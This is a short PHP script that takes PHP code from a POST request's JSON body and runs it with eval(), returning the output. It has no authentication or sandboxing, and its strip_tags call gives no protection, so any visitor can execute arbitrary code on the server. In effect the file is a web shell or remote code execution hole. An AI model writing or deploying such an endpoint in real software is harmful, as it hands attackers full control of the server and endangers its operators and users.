<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Get the PHP code from the request body
  $data = json_decode(file_get_contents('php://input'), true);
  $phpcode = $data['phpcode'];
  $phpcode = strip_tags($phpcode);

  
  // Execute the PHP code and capture the output
  ob_start();
  eval($phpcode);
  $output = ob_get_clean();

  // Return the output to the client
  echo $output;
}
?>
